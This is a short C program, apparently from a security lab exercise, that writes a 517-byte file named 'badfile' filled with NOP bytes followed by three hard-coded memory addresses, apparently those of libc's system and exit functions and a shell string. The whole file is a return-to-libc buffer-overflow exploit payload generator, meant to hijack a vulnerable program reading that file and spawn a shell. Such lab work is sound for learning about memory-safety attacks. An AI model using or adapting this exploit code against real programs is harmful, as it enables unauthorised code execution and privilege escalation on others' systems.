#include<stdio.h>
#include<string.h>


//char ret_addr[] = "\x40\xef\xff\xbf";
char nop[] = "\x90";
char addr1[]= "\xb0\x0d\xe4\xb7";
char addr2[] = "\xe0\x49\xe3\xb7";
char addr3[] = "\x0b\x1b\xf6\xb7";

int main(){
	FILE* badf;
	badf = fopen("badfile","w");
	char buff[517];
	int ind = 0;
	for(;ind<350;ind++)
		buff[ind] = nop[0];

	//for(int i=0;i<strlen(ret_addr);i++){
		//buff[ind++] = ret_addr[i];
	//}
	for(int i=0;i<strlen(addr1);i++){
		buff[ind++] = addr1[i];
	}
	for(int i=0;i<strlen(addr2);i++){
		buff[ind++] = addr2[i];
	}
	for(int i=0;i<strlen(addr3);i++){
		buff[ind++] = addr3[i];
	}
	

	fwrite(buff,517,1,badf);
	return 0;
}
